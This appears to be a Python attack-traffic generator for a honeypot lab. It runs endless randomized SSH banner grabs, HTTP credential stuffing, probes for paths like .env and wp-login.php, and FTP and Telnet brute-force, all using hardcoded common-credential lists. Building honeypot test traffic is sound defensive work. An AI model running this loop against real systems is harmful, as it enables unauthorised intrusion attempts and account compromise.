"""
Attacker bot: continuously attacks the honeypots on the network.

Runs as its own container (its own real IP) and launches real protocol
sessions — SSH banner grabs, HTTP credential stuffing, FTP and Telnet
brute-force — with randomized targets, credentials, and timing, the way
internet botnets scan and attack exposed services.
"""
import socket
import time
import random
import sys
import urllib.request
import urllib.parse

CRED_USERS = [
    "admin", "root", "administrator", "pi", "test", "user", "guest",
    "oracle", "ubuntu", "ftp", "backup", "service", "nas", "deploy",
]
CRED_PASS = [
    "admin", "123456", "password", "root", "toor", "admin123", "letmein",
    "qwerty", "P@ssw0rd", "raspberry", "1234", "iloveyou", "welcome",
    "changeme", "master", "dragon", "monkey", "abc123",
]


def attack_ssh(host):
    """Banner grab, like masscan/nmap fingerprinting sweeps."""
    s = socket.create_connection((host, 2222), timeout=5)
    s.recv(256)
    s.send(b"SSH-2.0-libssh_0.9.5\r\n")
    time.sleep(0.2)
    s.close()


def attack_http(host):
    """Credential stuffing against the fake admin panel."""
    if random.random() < 0.6:
        payload = urllib.parse.urlencode({
            "username": random.choice(CRED_USERS),
            "password": random.choice(CRED_PASS),
        }).encode()
        req = urllib.request.Request(
            f"http://{host}:8080/login", data=payload, method="POST"
        )
    else:
        req = urllib.request.Request(
            f"http://{host}:8080/{random.choice(['admin', 'wp-login.php', 'manager/html', '.env'])}"
        )
    urllib.request.urlopen(req, timeout=5).read()


def attack_ftp(host):
    """FTP brute-force with a credential pair."""
    s = socket.create_connection((host, 2121), timeout=5)
    s.recv(256)
    s.send(f"USER {random.choice(CRED_USERS)}\r\n".encode())
    time.sleep(random.uniform(0.2, 1.2))
    s.send(f"PASS {random.choice(CRED_PASS)}\r\n".encode())
    time.sleep(0.3)
    s.send(b"QUIT\r\n")
    s.close()


def attack_telnet(host):
    """Telnet console brute-force."""
    s = socket.create_connection((host, 2323), timeout=5)
    time.sleep(0.2)
    s.recv(1024)
    s.send(f"{random.choice(CRED_USERS)}\n".encode())
    time.sleep(random.uniform(0.2, 1.0))
    s.recv(1024)
    s.send(f"{random.choice(CRED_PASS)}\n".encode())
    time.sleep(0.3)
    s.close()


def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "backend"
    attacks = [attack_ssh, attack_http, attack_ftp, attack_telnet]
    while True:
        try:
            random.choice(attacks)(host)
        except Exception:
            pass
        time.sleep(random.uniform(4, 15))


if __name__ == "__main__":
    main()
